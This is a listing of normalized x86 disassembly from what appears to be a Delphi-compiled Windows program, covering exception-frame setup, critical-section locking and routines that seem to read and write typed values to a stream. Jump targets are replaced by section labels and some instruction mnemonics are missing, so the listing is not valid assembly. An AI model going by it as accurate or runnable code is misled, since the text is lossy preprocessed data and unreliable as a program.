mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_414418
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418cde
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_403344
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_4143bc
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_418d28
call sub_402784
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403b4c
jmp r-xdata
call sub_403af8
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_416e2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418d98
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_418d57
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_416fd4
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_403af8
call sub_403b4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418d98
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_403344
sub_418dc4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418e6e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_418e41
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419080
cmp al 0xb
je r-xdata
mov eax ebx
call sub_41107c
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41711c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_417154
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418e75
lea eax [ ebp - 0x8 ]
call sub_404094
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418ea4
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_418ea4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_417644
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404184
mov eax esi
call j_sub_404560#2
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_417644
pop edx
pop esi
pop ebx
retn
sub_418ee0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418f8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_417620
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_418f9c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_40431c
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418f94
lea eax [ ebp - 0x8 ]
call sub_404774
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_419080
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_417644
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4046e0
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_417644
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_417644
jmp r-xdata
jmp r-xdata
call sub_41711c
sub_418f9c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419073
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_417620
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_418ee0
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4048c0
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41907a
lea eax [ ebp - 0xc ]
call sub_404094
lea eax [ ebp - 0x8 ]
call sub_404094
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_419080
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_417644
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4049bc
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_417644
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_417644
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4046e0
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_417644
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405bb0
jmp r-xdata
jmp r-xdata
call sub_41711c
sub_419094
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4190d0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418ea4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4190d7
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_4190dc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_4172dc
test al al
je r-xdata
mov eax [ ebx ]
call sub_419190
mov eax [ ebx ]
call sub_418248
pop ebx
pop ebp
retn
sub_419104
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_417644
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_419588
pop ebx
pop ecx
pop ebp
retn
sub_419134
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_4172dc
test al al
je r-xdata
mov eax [ ebx ]
call sub_417620
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_418248
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_419588
jmp r-xdata
mov eax [ ebx ]
call sub_419190
mov eax [ ebx ]
call sub_4172dc
test al al
je r-xdata
mov eax [ ebx ]
call sub_41932c
mov eax [ ebx ]
call sub_418248
sub_419190
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41931f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419080
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419326
lea eax [ ebp - 0x8 ]
call sub_404094
retn
jmp [ eax * 4 + jump_table_4191c7 ]
push ebp
call sub_4190dc
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_419588
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_419588
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_419588
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_419588
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418ea4
jmp r-xdata
push ebp
mov eax 0x1
call sub_419104
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_419094
jmp r-xdata
push ebp
mov eax 0x1
call sub_419104
pop ecx
jmp r-xdata
push ebp
call sub_419134
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_419588
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_419588
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_419588
jmp r-xdata
push ebp
mov eax 0x2
call sub_419104
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_419588
jmp r-xdata
push ebp
mov eax 0x1
call sub_419104
pop ecx
sub_41932c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_419369
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418ea4
mov eax ebx
call sub_419190
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419370
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_419374
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_41940c
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_4172dc
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_418ea4
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_418ea4
jmp r-xdata
mov eax ebx
call sub_41932c
mov eax ebx
call sub_418248
jmp r-xdata
mov eax ebx
call sub_4172dc
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_419374
mov eax ebx
call sub_418248
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419413
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4040b8
retn
sub_41941c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4194c1
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_40412c
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41a2b8
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4194c8
lea eax [ ebp - 0x8 ]
call sub_404094
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdb4
call sub_403ad0
sub_4194ec
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_419514
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_417574
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_4139d8
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_403570
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_417574
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_419588
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_417644
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_417644
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_4195d0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_419779
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_4171a8
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419754
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_417644
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_4160d4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_417644
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_416a64
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41972f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_418ee0
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_417644
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_4160d4
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_417644
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_410cec
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
lea eax [ ebp - 0x1c ]
call sub_4057e0
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d6d4
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419736
mov eax [ ebp - 0xc ]
call sub_403344
retn
sub_419798
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419992
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40f248
mov eax [ ebp - 0x4 ]
call sub_417620
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
jmp [ eax * 4 + jump_table_4197da ]
mov eax [ ebp - 0x4 ]
call sub_419080
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_418190
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_410524
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418190
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_410524
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418190
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_410524
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417f74
mov eax ebx
call sub_4105b4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417fb8
mov eax ebx
call sub_4105b4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417ffc
mov eax ebx
call sub_4105dc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41804c
mov eax ebx
call sub_4105c8
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418ee0
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4105f0
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_418f9c
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_41061c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_419080
cmp al 0x9
sete dl
mov eax ebx
call sub_41058c
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_4195d0
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40f570
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4181fc
push edx
push eax
mov eax ebx
call sub_410560
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419999
lea eax [ ebp - 0x1c ]
call sub_40f25c
lea eax [ ebp - 0xc ]
call sub_404774
lea eax [ ebp - 0x8 ]
call sub_404094
retn
mov eax ebx
call sub_410dd4
jmp r-xdata
sub_4199a0
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_4199ec
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_419a18
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_419b88
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_4199a0
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_419b88
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_4199a0
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_419b88
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_4199a0
jmp r-xdata
pop edx
pop ebx
retn
sub_419a9c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_4044a0
je r-xdata
mov eax esi
call sub_404354
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_404354
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_419b88
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_4199a0
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_4199a0
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_419b88
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_4199a0
mov dl 0x6
mov eax ebx
call sub_419b88
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_4199a0
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_4199a0
sub_419b34
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419b79
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405c54
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_419a9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419b80
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_419c10
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdb4
call sub_403ad0
call sub_419be8
mov eax ebx
call sub_419bf4
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_419d9e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_419d7f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419d86
mov eax [ ebp - 0xc ]
call sub_403344
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4143bc
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41425c
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_419d49
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_419d1a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_419db0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_419f68
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_419dfc
push ebx
push esi
push ecx
call sub_4036d0
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_41a050
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_419ff8
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_414988
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_419fc0
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_4036b8
lea eax [ ebx + 0x14 ]
call sub_40d6a0
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_4143bc
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_419e80
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_414418
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_414210
mov edx ebx
mov eax esi
call sub_419e80
sub_419f14
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_414210
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x10 ] eax
sub_419f40
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_414500
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_403344
xor eax eax
mov [ ebx + 0x10 ] eax
sub_419f68
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403540
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_419f14
mov dl 0x1
mov eax ebx
call sub_41a488
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_41a438
sub_419fc0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_41a488
mov edx ebx
mov eax esi
call sub_419f40
pop edi
pop esi
pop ebx
retn
sub_419ff8
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4144a4
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_419fc0
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_419f40
sub_41a050
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_4143bc
call sub_41a050
inc edi
dec esi
jne r-xdata
sub_41a08c
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_414500
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_403344
xor eax eax
mov [ ebx + 0x14 ] eax
sub_41a0b0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41a08c
mov edx ebx
mov eax esi
call sub_41a08c
pop esi
pop ebx
retn
sub_41a0cc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_41a0b0
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4143bc
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
